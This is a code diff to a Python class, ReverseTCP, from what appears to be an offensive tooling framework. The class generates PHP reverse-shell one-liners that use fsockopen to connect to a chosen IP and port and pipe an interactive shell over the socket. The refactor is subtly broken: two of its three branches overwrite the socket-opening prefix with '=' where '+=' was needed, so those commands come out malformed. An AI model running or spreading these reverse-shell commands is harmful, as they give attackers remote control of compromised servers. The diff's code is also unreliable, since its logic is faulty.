@@ -27,18 +27,11 @@ class ReverseTCP(plugin.ReverseShell):
         self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
 
     def make_shell(self):
+        self.shell = """php -r '$sock=fsockopen("{}",{});""".format(self.args.ip, self.args.port)
         if self.args.exec == "back_quote":
-            self.shell = """php -r '$sock=fsockopen("{}",{});`{} -i <&3 >&3 2>&3`;'""".format(self.args.ip,
-                                                                                              self.args.port,
-                                                                                              self.args.shell)
+            self.shell += """`{} -i <&3 >&3 2>&3`;'""".format(self.args.shell)
         elif self.args.exec == "proc_open":
-            self.shell = """php -r '$sock=fsockopen("{}",{});$proc=proc_open("{} -i", array(0=>$sock, 1=>$sock, 
-            2=>$sock),$pipes);'""".format(
-                self.args.ip,
-                self.args.port,
-                self.args.shell)
+            self.shell = """$proc=proc_open("{} -i",""".format(self.args.shell)
+            self.shell += "array(0=>$sock, 1=>$sock,2=>$sock),$pipes);'"
         else:
-            self.shell = """php -r '$sock=fsockopen("{}",{});{}("{} -i <&3 >&3 2>&3");'""".format(self.args.ip,
-                                                                                                  self.args.port,
-                                                                                                  self.args.exec,
-                                                                                                  self.args.shell)
+            self.shell = """{}("{} -i <&3 >&3 2>&3");'""".format(self.args.exec, self.args.shell)
